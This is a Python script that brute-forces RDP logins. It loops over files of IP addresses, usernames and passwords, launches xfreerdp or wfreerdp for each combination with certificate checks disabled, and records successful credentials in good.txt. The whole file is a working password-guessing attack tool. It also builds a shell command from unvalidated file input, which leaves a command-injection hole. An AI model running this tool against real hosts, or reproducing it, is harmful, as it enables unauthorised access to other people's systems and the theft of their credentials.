# -*- coding: utf-8 -*-

import asyncio
from async_timeout import timeout as ftime
from aiofiles import open as afile
from platform import system as sys_ver
from asyncio import create_subprocess_shell as run
from asyncio.subprocess import DEVNULL


# OS Detect
if sys_ver() == 'Windows':
    fr_name = 'wfreerdp.exe'
else:
    fr_name = 'xfreerdp'


async def connect(ip, user, password):
    global good, finished

    try:
        r_agr = f"{fr_name} /v:{ip} /port:{port} /u:'{user}' " + \
                    f"/p:'{password}' /cert-ignore +auth-only " + \
                    '+compression /sec:nla'

        a = await run(r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)

        async with ftime(timeout):
            await a.communicate()

        assert a.returncode == 0

        good += 1
        rez = f'{ip}:{port};{user}:{password}\n'

        async with afile(f'good.txt', 'a', encoding='utf-8',
                         errors='ignore') as f:
            await f.write(rez)
    except:
        await a.kill()
    finally:
        finished += 1
        print(f'Good: {good}; Done: {finished}', end="\r")
        return


async def start():
    tasks = []

    async with afile('data/users.txt', errors="ignore",
                     encoding="utf-8") as users:
        async for user in users:
            async with afile('data/passwords.txt', errors="ignore",
                             encoding="utf-8") as passws:
                async for passw in passws:
                    async with afile('data/ip.txt', errors="ignore",
                                     encoding="utf-8") as ips:
                        async for ip in ips:
                            task = asyncio.create_task(
                                connect(
                                    ip.replace('\n', ''),
                                    user.replace('\n', ''),
                                    passw.replace('\n', '')
                                )
                            )
                            tasks.append(task)

                            if len(tasks) >= threads:
                                await asyncio.gather(*tasks)
                                tasks = []


if __name__ == "__main__":
    good = 0
    finished = 0
    threads = int(input('Threads: '))
    timeout = int(input('Timeout: '))
    port = int(input('Port: ') or 3389)

    asyncio.run(start())
